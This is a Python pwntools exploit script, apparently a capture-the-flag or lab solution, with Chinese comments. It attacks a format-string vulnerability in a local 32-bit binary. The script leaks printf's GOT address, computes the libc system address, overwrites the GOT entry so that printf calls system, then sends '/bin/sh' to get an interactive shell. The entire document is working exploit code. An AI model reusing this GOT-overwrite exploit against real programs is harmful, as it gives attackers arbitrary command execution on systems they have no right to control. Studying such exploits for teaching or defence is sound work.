# -*- coding: utf-8 -*-
from pwn import *

elf = ELF('./a.out')
r = process('./a.out')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# 计算偏移量
def exec_fmt(payload):
    r.sendline(payload)
    info = r.recv()
    return info
auto = FmtStr(exec_fmt)
offset = auto.offset

# 获得 printf 的 GOT 地址
printf_got = elf.got['printf']
log.success("printf_got => {}".format(hex(printf_got)))

# 获得 printf 的虚拟地址
payload = p32(printf_got) + '%{}$s'.format(offset)
r.send(payload)
printf_addr = u32(r.recv()[4:8])
log.success("printf_addr => {}".format(hex(printf_addr)))

# 获得 system 的虚拟地址
system_addr = printf_addr - (libc.symbols['printf'] - libc.symbols['system'])
log.success("system_addr => {}".format(hex(system_addr)))

payload = fmtstr_payload(offset, {printf_got : system_addr})
r.send(payload)
r.send('/bin/sh')
r.recv()
r.interactive()
